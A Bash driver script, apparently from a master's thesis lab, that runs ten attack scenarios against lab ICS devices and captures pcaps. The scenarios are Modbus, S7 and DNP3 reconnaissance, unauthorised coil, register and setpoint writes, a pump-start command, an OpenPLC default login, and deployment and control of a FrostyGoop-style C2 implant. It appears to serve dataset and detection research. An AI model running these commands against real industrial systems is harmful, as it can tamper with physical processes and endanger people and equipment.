#!/usr/bin/env bash
# ejecutar_todos.sh - Secuencia los 10 escenarios de ataque del TFM.
# Cada uno con su propio pcap etiquetado en 'capturas pcap/'.
# Requiere: kali en modo 'control' con rutas directas a OT (ver
# preparar_router.sh + 'echo control > /ataques/.mode').
set -euo pipefail

AQUI="$(cd "$(dirname "$0")" && pwd)"
E="$AQUI/ejecutar_escenario.sh"
R=/ataques/_tfm_run.py

echo "####### 1. recon Modbus (nmap modbus-discover) #######"
bash "$E" recon_modbus --seg 60 -- "python3 $R recon modbus_discover --target 192.168.10.10"
sleep 5

echo "####### 2. recon S7 (nmap s7-info.nse) #######"
bash "$E" recon_s7 --seg 60 -- "python3 $R recon s7_discover --target 192.168.30.10"
sleep 5

echo "####### 3. recon DNP3 #######"
bash "$E" recon_dnp3 --seg 60 -- "python3 $R recon dnp3_discover --target 192.168.40.10"
sleep 5

echo "####### 4. Modbus write_coil (FC=5 no autorizado) #######"
bash "$E" modbus_write_coil --seg 60 -- "python3 $R modbus_msf write_coil --target 192.168.10.10 port=502 data_address=0 data=1 unit_id=1"
sleep 5

echo "####### 5. Modbus write_register (FC=6 no autorizado) #######"
bash "$E" modbus_write_register --seg 60 -- "python3 $R modbus_msf write_register --target 192.168.10.10 port=502 data_address=20 data=9999 unit_id=1"
sleep 5

echo "####### 6. S7 write_setpoint (DB1 no autorizado) #######"
bash "$E" s7_write_setpoint --seg 60 -- "python3 -m modules._cli.s7_cli write_setpoint --target 192.168.30.10 --valor 99.9"
sleep 5

echo "####### 7. S7 write_marcha (bomba on no autorizado) #######"
bash "$E" s7_write_marcha --seg 60 -- "python3 -m modules._cli.s7_cli write_marcha --target 192.168.30.10 --valor true"
sleep 5

echo "####### 8. DNP3 read #######"
bash "$E" dnp3_read --seg 60 -- "python3 -m modules._cli.dnp3_cli read --target 192.168.40.10"
sleep 5

echo "####### 9. OpenPLC default_login #######"
bash "$E" openplc_login --seg 60 -- "python3 -m modules._cli.openplc_cli default_login --target 192.168.10.10 --port 8080"
sleep 5

echo "####### 10. C2 FrostyGoop (deploy + write_register + exit) #######"
bash "$E" c2_frostygoop --seg 180 -- "echo '--- deploy ---' && python3 -m modules._cli.c2_modbus_cli deploy --mailbox 192.168.10.11 && sleep 20 && echo '--- write_register via C2 ---' && python3 -m modules._cli.c2_modbus_cli write_register --mailbox 192.168.10.11 --target-ip 192.168.10.10 --data-address 20 --value 1234 && sleep 15 && echo '--- exit implant ---' && python3 -m modules._cli.c2_modbus_cli exit_implant --mailbox 192.168.10.11"
sleep 5

echo
echo "========== TODOS LOS ESCENARIOS COMPLETADOS =========="
find "$AQUI/../../capturas pcap/ataques" -name 'atk_*.pcap' -printf '   %p %s bytes\n' 2>/dev/null | sort
